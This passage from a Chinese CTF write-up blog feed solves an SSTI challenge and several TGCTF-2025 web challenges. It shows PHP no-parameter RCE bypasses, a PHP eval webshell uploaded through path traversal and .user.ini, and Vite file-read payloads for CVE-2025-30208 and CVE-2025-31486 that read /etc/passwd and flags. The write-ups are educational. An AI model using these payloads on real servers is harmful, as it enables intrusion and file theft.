class="line">31</span><br></pre></td><td class="code"><pre><code class="hljs maxima">import <span class="hljs-built_in">base64</span><br>from urllib.parse import quote<br>def rc4_main(<span class="hljs-built_in">key</span> = <span class="hljs-string">&quot;init_key&quot;</span>, message = <span class="hljs-string">&quot;init_message&quot;</span>):<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;RC4加密主函数&quot;</span>)<br>    s_box = rc4_init_sbox(<span class="hljs-built_in">key</span>)<br>    crypt = str(rc4_excrypt(message, s_box))<br>    <span class="hljs-built_in">return</span>  crypt<br>def rc4_init_sbox(<span class="hljs-built_in">key</span>):<br>    s_box = list(<span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>))  <br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;原来的 s 盒：%s&quot;</span> <span class="hljs-symbol">%</span> s_box)<br>    j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> i <span class="hljs-keyword">in</span> <span class="hljs-built_in">range</span>(<span class="hljs-number">256</span>):<br>        j = (j + s_box[i] + ord(<span class="hljs-built_in">key</span>[i <span class="hljs-symbol">%</span> len(<span class="hljs-built_in">key</span>)])) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        s_box[i], s_box[j] = s_box[j], s_box[i]<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;混乱后的 s 盒：%s&quot;</span><span class="hljs-symbol">%</span> s_box)<br>    <span class="hljs-built_in">return</span> s_box<br>def rc4_excrypt(plain, <span class="hljs-built_in">box</span>):<br>    # <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;调用加密程序成功。&quot;</span>)<br>    res = []<br>    i = j = <span class="hljs-number">0</span><br>    <span class="hljs-keyword">for</span> s <span class="hljs-keyword">in</span> plain:<br>        i = (i + <span class="hljs-number">1</span>) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        j = (j + <span class="hljs-built_in">box</span>[i]) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        <span class="hljs-built_in">box</span>[i], <span class="hljs-built_in">box</span>[j] = <span class="hljs-built_in">box</span>[j], <span class="hljs-built_in">box</span>[i]<br>        t = (<span class="hljs-built_in">box</span>[i] + <span class="hljs-built_in">box</span>[j]) <span class="hljs-symbol">%</span> <span class="hljs-number">256</span><br>        k = <span class="hljs-built_in">box</span>[t]<br>        res.<span class="hljs-built_in">append</span>(chr(ord(s) ^ k))<br>    cipher = <span class="hljs-string">&quot;&quot;</span>.<span class="hljs-built_in">join</span>(res)<br>    <span class="hljs-built_in">print</span>(<span class="hljs-string">&quot;加密后的字符串是：%s&quot;</span> %quote(cipher))<br>    <span class="hljs-built_in">return</span> (str(<span class="hljs-built_in">base64</span>.b64encode(cipher.encode(&#x27;utf-<span class="hljs-number">8</span>&#x27;)), &#x27;utf-<span class="hljs-number">8</span>&#x27;))<br>rc4_main(<span class="hljs-string">&quot;HereIsTreasure&quot;</span>,<span class="hljs-string">&quot;&#123;&#123;&#x27;&#x27;.__class__.__mro__.__getitem__(2).__subclasses__().pop(40)(&#x27;/flag.txt&#x27;).read()&#125;&#125;&quot;</span>)<br></code></pre></td></tr></table></figure><p>输出</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">.<span class="hljs-variable">%14</span><span class="hljs-variable">%1</span>E<span class="hljs-variable">%12</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%A484mg</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%C3</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%00</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%8</span>D<span class="hljs-variable">%C2</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%97</span><span class="hljs-variable">%0</span>B<span class="hljs-variable">%C2</span><span class="hljs-variable">%9</span>EF<span class="hljs-variable">%3</span>B<span class="hljs-variable">%C2</span><span class="hljs-variable">%88</span>m<span class="hljs-variable">%C2</span><span class="hljs-variable">%AEM5</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%96</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C2</span><span class="hljs-variable">%9</span>D<span class="hljs-variable">%5</span>B<span class="hljs-variable">%C3</span><span class="hljs-variable">%987</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%AA</span><span class="hljs-variable">%12</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%05</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%84</span>A<span class="hljs-variable">%C2</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%17</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%9</span>Bh<span class="hljs-variable">%C3</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%C2</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%C3</span><span class="hljs-variable">%A1a</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%C2</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%09</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%AEyS</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%C2</span><span class="hljs-variable">%A2d</span><span class="hljs-variable">%7</span>C<span class="hljs-variable">%C2</span><span class="hljs-variable">%98</span>/<span class="hljs-variable">%00</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%90</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%03</span>Y<span class="hljs-variable">%C2</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%1</span>F<span class="hljs-variable">%C2</span><span class="hljs-variable">%B6H</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%C2</span><span class="hljs-variable">%9</span>Cp<span class="hljs-variable">%C2</span><span class="hljs-variable">%AEn</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%96</span>i<span class="hljs-variable">%5</span>Dv<span class="hljs-variable">%7</span>FX<span class="hljs-variable">%C2</span><span class="hljs-variable">%92</span><br></code></pre></td></tr></table></figure><p>传入payload：</p><figure class="highlight llvm"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs llvm">/secret?secret<span class="hljs-operator">=</span>.<span class="hljs-variable">%14</span><span class="hljs-variable">%1</span>E<span class="hljs-variable">%12</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%A484mg</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%9</span>C<span class="hljs-variable">%C3</span><span class="hljs-variable">%8</span>B<span class="hljs-variable">%00</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%81</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%8</span>D<span class="hljs-variable">%C2</span><span class="hljs-variable">%B8</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%97</span><span class="hljs-variable">%0</span>B<span class="hljs-variable">%C2</span><span class="hljs-variable">%9</span>EF<span class="hljs-variable">%3</span>B<span class="hljs-variable">%C2</span><span class="hljs-variable">%88</span>m<span class="hljs-variable">%C2</span><span class="hljs-variable">%AEM5</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%96</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%C2</span><span class="hljs-variable">%9</span>D<span class="hljs-variable">%5</span>B<span class="hljs-variable">%C3</span><span class="hljs-variable">%987</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%AA</span><span class="hljs-variable">%12</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%B4</span><span class="hljs-variable">%05</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%84</span>A<span class="hljs-variable">%C2</span><span class="hljs-variable">%BF</span><span class="hljs-variable">%17</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%9</span>Bh<span class="hljs-variable">%C3</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%C2</span><span class="hljs-variable">%8</span>F<span class="hljs-variable">%C3</span><span class="hljs-variable">%A1a</span><span class="hljs-variable">%0</span>F<span class="hljs-variable">%C2</span><span class="hljs-variable">%AE</span><span class="hljs-variable">%09</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%A0</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%AEyS</span><span class="hljs-variable">%2</span>A<span class="hljs-variable">%C2</span><span class="hljs-variable">%A2d</span><span class="hljs-variable">%7</span>C<span class="hljs-variable">%C2</span><span class="hljs-variable">%98</span>/<span class="hljs-variable">%00</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%90</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%A9</span><span class="hljs-variable">%03</span>Y<span class="hljs-variable">%C2</span><span class="hljs-variable">%B2</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%9</span>B<span class="hljs-variable">%1</span>F<span class="hljs-variable">%C2</span><span class="hljs-variable">%B6H</span><span class="hljs-variable">%3</span>D<span class="hljs-variable">%0</span>A<span class="hljs-variable">%23</span><span class="hljs-variable">%C3</span><span class="hljs-variable">%B1</span><span class="hljs-variable">%5</span>B<span class="hljs-variable">%C2</span><span class="hljs-variable">%9</span>Cp<span class="hljs-variable">%C2</span><span class="hljs-variable">%AEn</span><span class="hljs-variable">%C2</span><span class="hljs-variable">%96</span>i<span class="hljs-variable">%5</span>Dv<span class="hljs-variable">%7</span>FX<span class="hljs-variable">%C2</span><span class="hljs-variable">%92</span><br></code></pre></td></tr></table></figure><p>拿到flag</p>]]></content>
      
      
      
        <tags>
            
            <tag> 刷题笔记 </tag>
            
            <tag> 信息搜集 </tag>
            
            <tag> RC4加密 </tag>
            
            <tag> ssti </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>TGCTF-2025复现</title>
      <link href="/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/"/>
      <url>/2025/04/15/TGCTF-2025%E5%A4%8D%E7%8E%B0/</url>
      
        <content type="html"><![CDATA[<h1 id="web"><a href="#web" class="headerlink" title="web"></a>web</h1><h2 id="AAA偷渡阴平（复仇）"><a href="#AAA偷渡阴平（复仇）" class="headerlink" title="AAA偷渡阴平（复仇）"></a>AAA偷渡阴平（复仇）</h2><p>源码：</p><figure class="highlight gherkin"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br></pre></td><td class="code"><pre><code class="hljs gherkin"> <span class="hljs-variable">&lt;?php</span><br><span class="hljs-variable"></span><br><span class="hljs-variable"></span><br><span class="hljs-variable">$tgctf2025=$_GET[&#x27;tgctf2025&#x27;];</span><br><span class="hljs-variable"></span><br><span class="hljs-variable">if(!preg_match(&quot;/0|1|[3-9]|\~|\`|\@|\#|\\$|\%|\^|\&amp;|\*|\（|\）|\-|\=|\+|\&#123;|\[|\]|\&#125;|\:|\&#x27;|\&quot;|\,|\&lt;|\.|\&gt;</span>|<span class="hljs-string">\/</span>|<span class="hljs-string">\?</span>|<span class="hljs-string">\\\\</span>|<span class="hljs-string">localeconv</span>|<span class="hljs-string">pos</span>|<span class="hljs-string">current</span>|<span class="hljs-string">print</span>|<span class="hljs-string">var</span>|<span class="hljs-string">dump</span>|<span class="hljs-string">getallheaders</span>|<span class="hljs-string">get</span>|<span class="hljs-string">defined</span>|<span class="hljs-string">str</span>|<span class="hljs-string">split</span>|<span class="hljs-string">spl</span>|<span class="hljs-string">autoload</span>|<span class="hljs-string">extensions</span>|<span class="hljs-string">eval</span>|<span class="hljs-string">phpversion</span>|<span class="hljs-string">floor</span>|<span class="hljs-string">sqrt</span>|<span class="hljs-string">tan</span>|<span class="hljs-string">cosh</span>|<span class="hljs-string">sinh</span>|<span class="hljs-string">ceil</span>|<span class="hljs-string">chr</span>|<span class="hljs-string">dir</span>|<span class="hljs-string">getcwd</span>|<span class="hljs-string">getallheaders</span>|<span class="hljs-string">end</span>|<span class="hljs-string">next</span>|<span class="hljs-string">prev</span>|<span class="hljs-string">reset</span>|<span class="hljs-string">each</span>|<span class="hljs-string">pos</span>|<span class="hljs-string">current</span>|<span class="hljs-string">array</span>|<span class="hljs-string">reverse</span>|<span class="hljs-string">pop</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">flip</span>|<span class="hljs-string">rand</span>|<span class="hljs-string">content</span>|<span class="hljs-string">echo</span>|<span class="hljs-string">readfile</span>|<span class="hljs-string">highlight</span>|<span class="hljs-string">show</span>|<span class="hljs-string">source</span>|<span class="hljs-string">file</span>|<span class="hljs-string">assert/i&quot;, $tgctf2025))&#123;</span><br><span class="hljs-string">    //hint：你可以对着键盘一个一个看，然后在没过滤的符号上用记号笔画一下（bushi</span><br><span class="hljs-string">    eval($tgctf2025);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string">else&#123;</span><br><span class="hljs-string">    die(&#x27;(╯‵□′)╯炸弹！•••*～●&#x27;);</span><br><span class="hljs-string">&#125;</span><br><span class="hljs-string"></span><br><span class="hljs-string">highlight_file(__FILE__);</span><br></code></pre></td></tr></table></figure><p>这题就是之前那题的升级版，把无参数RCE给ban了，依旧是让我们去使用eval危险函数进行命令执行。</p><p>当时做这题的时候感觉太难了做不了一点，结果发现题解就是学过的利用session进行无参数RCE，感觉天塌了，这都没想到，当时是以为要用什么其他方法无参RCE用不了。</p><p><strong>利用session绕过</strong></p><p>一定要先进行十六进制编码然后通过hex2bin函数解码才能执行命令</p><p>payload：</p><figure class="highlight routeros"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs routeros">?<span class="hljs-attribute">tgctf2025</span>=session_start();system(hex2bin(session_id()));<br><br>burpsuite抓包修改Cookie: <span class="hljs-attribute">PHPSESSID</span>=xxx<br><span class="hljs-attribute">PHPSESSID</span>=636174202f666c6167 cat /flag的十六进制<br></code></pre></td></tr></table></figure><p>其他解法（非预期）：</p><p><strong>请求头绕过，只适用于apache服务器，功能与getallheaders()相似</strong></p><p>注意：在用请求头绕过时，尽量把没用的请求头删了，不然会有报错</p><p>首先了解几个函数的作用</p><figure class="highlight stylus"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs stylus"><span class="hljs-function"><span class="hljs-title">implode</span><span class="hljs-params">()</span></span>返回一个由数组元素组合成的字符串<br><span class="hljs-function"><span class="hljs-title">apache_request_headers</span><span class="hljs-params">()</span></span>以数组形式返回apache服务器的请求头部信息<br><span class="hljs-function"><span class="hljs-title">key</span><span class="hljs-params">()</span></span>从关联数组中取得键名<br><span class="hljs-function"><span class="hljs-title">lcfirst</span><span class="hljs-params">()</span></span>用于将字符串中的首字符转换为小写。<br></code></pre></td></tr></table></figure><p>payload：</p><figure class="highlight ldif"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br></pre></td><td class="code"><pre><code class="hljs ldif">?tgctf2025=system(implode(apache_request_headers()));<br><br>bp抓包<br>然后将请求头的值拼接为cat /flag<br><span class="hljs-attribute">1</span>: c<br><span class="hljs-attribute">2</span>: a<br><span class="hljs-attribute">3</span>: t<br><span class="hljs-attribute">4</span>: $&#123;IFS&#125;/<br><span class="hljs-attribute">5</span>: f<br><span class="hljs-attribute">6</span>: l<br><span class="hljs-attribute">7</span>: a<br><span class="hljs-attribute">8</span>: g<br></code></pre></td></tr></table></figure><p>或者</p><figure class="highlight sas"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br></pre></td><td class="code"><pre><code class="hljs sas">?tgctf2025=<span class="hljs-meta">system</span>(hex2bi<span class="hljs-meta">n</span>(lcfirst(<span class="hljs-keyword">key</span>(apache_request_headers()))));<br><br>bp抓包然后在请求头里添加一个636174202f666c6167: 123<br></code></pre></td></tr></table></figure><hr><h2 id="ez-upload"><a href="#ez-upload" class="headerlink" title="(ez)upload"></a><strong>(ez)upload</strong></h2><p>当时做这题我就想着能够传入.user.ini但是上传目录中没有.php文件，无法实现包含，所以搞得一头雾水，结果看完题解说能够目录传越将.user.ini传到上级目录直接人傻了，而且上级目录有两个.php文件，直接能实现包含。</p><p>访问url&#x2F;upload.bak把源码下载下来</p><p>代码审计</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br><span class="line">14</span><br><span class="line">15</span><br><span class="line">16</span><br><span class="line">17</span><br><span class="line">18</span><br><span class="line">19</span><br><span class="line">20</span><br><span class="line">21</span><br><span class="line">22</span><br><span class="line">23</span><br><span class="line">24</span><br><span class="line">25</span><br><span class="line">26</span><br><span class="line">27</span><br><span class="line">28</span><br><span class="line">29</span><br><span class="line">30</span><br><span class="line">31</span><br><span class="line">32</span><br><span class="line">33</span><br><span class="line">34</span><br><span class="line">35</span><br><span class="line">36</span><br><span class="line">37</span><br><span class="line">38</span><br><span class="line">39</span><br><span class="line">40</span><br><span class="line">41</span><br><span class="line">42</span><br><span class="line">43</span><br><span class="line">44</span><br><span class="line">45</span><br><span class="line">46</span><br><span class="line">47</span><br><span class="line">48</span><br><span class="line">49</span><br><span class="line">50</span><br><span class="line">51</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span><br><span class="hljs-title function_ invoke__">define</span>(<span class="hljs-string">&#x27;UPLOAD_PATH&#x27;</span>, <span class="hljs-keyword">__DIR__</span> . <span class="hljs-string">&#x27;/uploads/&#x27;</span>);<br><span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">false</span>;<br><span class="hljs-variable">$msg</span> = <span class="hljs-literal">null</span>;<br><span class="hljs-variable">$status_code</span> = <span class="hljs-number">200</span>; <span class="hljs-comment">// 默认状态码为 200</span><br><span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;submit&#x27;</span>])) &#123;<br>    <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">file_exists</span>(UPLOAD_PATH)) &#123;<br>        <span class="hljs-variable">$deny_ext</span> = <span class="hljs-keyword">array</span>(<span class="hljs-string">&quot;php&quot;</span>, <span class="hljs-string">&quot;php5&quot;</span>, <span class="hljs-string">&quot;php4&quot;</span>, <span class="hljs-string">&quot;php3&quot;</span>, <span class="hljs-string">&quot;php2&quot;</span>, <span class="hljs-string">&quot;html&quot;</span>, <span class="hljs-string">&quot;htm&quot;</span>, <span class="hljs-string">&quot;phtml&quot;</span>, <span class="hljs-string">&quot;pht&quot;</span>, <span class="hljs-string">&quot;jsp&quot;</span>, <span class="hljs-string">&quot;jspa&quot;</span>, <span class="hljs-string">&quot;jspx&quot;</span>, <span class="hljs-string">&quot;jsw&quot;</span>, <span class="hljs-string">&quot;jsv&quot;</span>, <span class="hljs-string">&quot;jspf&quot;</span>, <span class="hljs-string">&quot;jtml&quot;</span>, <span class="hljs-string">&quot;asp&quot;</span>, <span class="hljs-string">&quot;aspx&quot;</span>, <span class="hljs-string">&quot;asa&quot;</span>, <span class="hljs-string">&quot;asax&quot;</span>, <span class="hljs-string">&quot;ascx&quot;</span>, <span class="hljs-string">&quot;ashx&quot;</span>, <span class="hljs-string">&quot;asmx&quot;</span>, <span class="hljs-string">&quot;cer&quot;</span>, <span class="hljs-string">&quot;swf&quot;</span>, <span class="hljs-string">&quot;htaccess&quot;</span>);<br><br>        <span class="hljs-keyword">if</span> (<span class="hljs-keyword">isset</span>(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-title function_ invoke__">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br>        &#125;<br>        <span class="hljs-variable">$file_ext</span> = <span class="hljs-title function_ invoke__">pathinfo</span>(<span class="hljs-variable">$file_name</span>, PATHINFO_EXTENSION);<br><br>        <span class="hljs-keyword">if</span> (!<span class="hljs-title function_ invoke__">in_array</span>(<span class="hljs-variable">$file_ext</span>, <span class="hljs-variable">$deny_ext</span>)) &#123;<br>            <span class="hljs-variable">$temp_file</span> = <span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;tmp_name&#x27;</span>];<br>            <span class="hljs-variable">$file_content</span> = <span class="hljs-title function_ invoke__">file_get_contents</span>(<span class="hljs-variable">$temp_file</span>);<br><br>            <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">preg_match</span>(<span class="hljs-string">&#x27;/.+?&lt;/s&#x27;</span>, <span class="hljs-variable">$file_content</span>)) &#123;<br>                <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件内容包含非法字符，禁止上传！&#x27;</span>;<br>                <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>            &#125; <span class="hljs-keyword">else</span> &#123;<br>                <span class="hljs-variable">$img_path</span> = UPLOAD_PATH . <span class="hljs-variable">$file_name</span>;<br>                <span class="hljs-keyword">if</span> (<span class="hljs-title function_ invoke__">move_uploaded_file</span>(<span class="hljs-variable">$temp_file</span>, <span class="hljs-variable">$img_path</span>)) &#123;<br>                    <span class="hljs-variable">$is_upload</span> = <span class="hljs-literal">true</span>;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;文件上传成功！&#x27;</span>;<br>                &#125; <span class="hljs-keyword">else</span> &#123;<br>                    <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;上传出错！&#x27;</span>;<br>                    <span class="hljs-variable">$status_code</span> = <span class="hljs-number">500</span>; <span class="hljs-comment">// 500 表示服务器内部错误</span><br>                &#125;<br>            &#125;<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$msg</span> = <span class="hljs-string">&#x27;禁止保存为该类型文件！&#x27;</span>;<br>            <span class="hljs-variable">$status_code</span> = <span class="hljs-number">403</span>; <span class="hljs-comment">// 403 表示禁止访问</span><br>        &#125;<br>    &#125; <span class="hljs-keyword">else</span> &#123;<br>        <span class="hljs-variable">$msg</span> = UPLOAD_PATH . <span class="hljs-string">&#x27;文件夹不存在,请手工创建！&#x27;</span>;<br>        <span class="hljs-variable">$status_code</span> = <span class="hljs-number">404</span>; <span class="hljs-comment">// 404 表示资源未找到</span><br>    &#125;<br>&#125;<br><br><span class="hljs-comment">// 设置 HTTP 状态码</span><br><span class="hljs-title function_ invoke__">http_response_code</span>(<span class="hljs-variable">$status_code</span>);<br><br><span class="hljs-comment">// 输出结果</span><br><span class="hljs-keyword">echo</span> <span class="hljs-title function_ invoke__">json_encode</span>([<br>    <span class="hljs-string">&#x27;status_code&#x27;</span> =&gt; <span class="hljs-variable">$status_code</span>,<br>    <span class="hljs-string">&#x27;msg&#x27;</span> =&gt; <span class="hljs-variable">$msg</span>,<br>]);<br></code></pre></td></tr></table></figure><hr><p>构造payload：</p><p>过滤了一堆后缀，同时用preg_match进行了waf，不闭合尖括号即可绕过preg_match的正则匹配：</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_REQUEST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>也可以使用PCRE回溯次数绕过</p><figure class="highlight php"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs php"><span class="hljs-number">101</span>万左右的任意字符+<span class="hljs-meta">&lt;?php</span> <span class="hljs-keyword">eval</span>(<span class="hljs-variable">$_POST</span>[<span class="hljs-string">&#x27;cmd&#x27;</span>]);<span class="hljs-meta">?&gt;</span><br></code></pre></td></tr></table></figure><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><code class="hljs bash"><span class="hljs-keyword">if</span> (isset(<span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>])) &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-variable">$_GET</span>[<span class="hljs-string">&#x27;name&#x27;</span>];<br>        &#125; <span class="hljs-keyword">else</span> &#123;<br>            <span class="hljs-variable">$file_name</span> = <span class="hljs-built_in">basename</span>(<span class="hljs-variable">$_FILES</span>[<span class="hljs-string">&#x27;name&#x27;</span>][<span class="hljs-string">&#x27;name&#x27;</span>]);<br></code></pre></td></tr></table></figure><p>这里我们注意到可以传入name参数来控制文件名，且basename文件没有对传入的name参数进行清洗</p><figure class="highlight autoit"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs autoit">$img_path = UPLOAD_PATH . $file_name<span class="hljs-comment">;</span><br></code></pre></td></tr></table></figure><p>$img_path是由文件名直接拼接得到的，存在目录穿越漏洞，因此我们可以将文件上传到&#x2F;var&#x2F;www&#x2F;html目录中，配合.user.ini实现对非.php文件的解析，上线webshell</p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-1.png"></p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-2.png"></p><p>payload：</p><figure class="highlight pgsql"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><code class="hljs pgsql">/<span class="hljs-keyword">index</span>.php?cmd=<span class="hljs-keyword">system</span>(&quot;env&quot;);<br>或/upload.php?cmd=<span class="hljs-keyword">system</span>(&quot;env&quot;);<br></code></pre></td></tr></table></figure><hr><h2 id="前端GAME"><a href="#前端GAME" class="headerlink" title="前端GAME"></a>前端GAME</h2><p>做这题以为和其他前端小游戏题一样，要么改分要么直接触发通关，结果看题解说是CVE任意文件读取</p><p>先查看源码</p><p><img src="/../image/TGCTF-2025%E5%A4%8D%E7%8E%B0-3.png"></p><p>提示flag在&#x2F;tgflagggg，但是并没有找到相关读取功能，但是可以检索到相关CVE：</p><p><a href="https://www.cnblogs.com/risheng/p/18795361">Vite CVE-2025-30208安全漏洞</a></p><p><a href="https://blog.csdn.net/IDHALASHAO/article/details/146611941">CVE-2025-30208 |Vite-漏洞分析与复现</a></p><p>payload：</p><figure class="highlight aspectj"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs aspectj">/<span class="hljs-meta">@fs</span>/tgflagggg?<span class="hljs-keyword">import</span>&amp;raw??<br></code></pre></td></tr></table></figure><h2 id="前端GAME-Plus"><a href="#前端GAME-Plus" class="headerlink" title="前端GAME Plus"></a><strong>前端GAME Plus</strong></h2><p>考点总结：CVE-2025-31486 </p><p>Vite开发服务器任意文件读取漏洞 题目描述：非常适合新生的前端小游戏Plus版，真的吗。 WP： CVE-<a href="https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&mid=2247483811&idx=1&sn=2b4403023fd911f611bf5590ea3796d6&scene=21#wechat_redirect">https://mp.weixin.qq.com/s?__biz=MzkyMTcwNjg4Mw==&amp;mid=2247483811&amp;idx=1&amp;sn=2b4403023fd911f611bf5590ea3796d6&amp;scene=21#wechat_redirect</a></p><p>flag在根目录下 &#x2F;tgflagggg 中 </p><figure class="highlight crystal"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br></pre></td><td class="code"><pre><code class="hljs crystal">/etc/passwd?.svg?.wasm?init<br><span class="hljs-regexp">/tgflagggg?.svg?.wasm?init</span><br><span class="hljs-regexp">#这个打法，不太好猜路径</span><br><span class="hljs-regexp">curl &quot;http:/</span><span class="hljs-regexp">/node1.tgctf.woooo.tech:32613/</span><span class="hljs-variable">@fs</span>/app/?<span class="hljs-regexp">/../</span>../../../../tgflagggg?<br>import&amp;?raw<br></code></pre></td></tr></table></figure><hr><h2 id="前端GAME-Ultra"><a href="#前端GAME-Ultra" class="headerlink" title="前端GAME Ultra"></a><strong>前端GAME Ultra</strong></h2><p>考点总结：CVE-2025-32395 </p><p>Vite开发服务器任意文件读取漏洞（兵不厌诈） 题目描述：非常适合新生的前端小游戏Ultra版，真的吗。 WP： CVE-2025-32395 <a 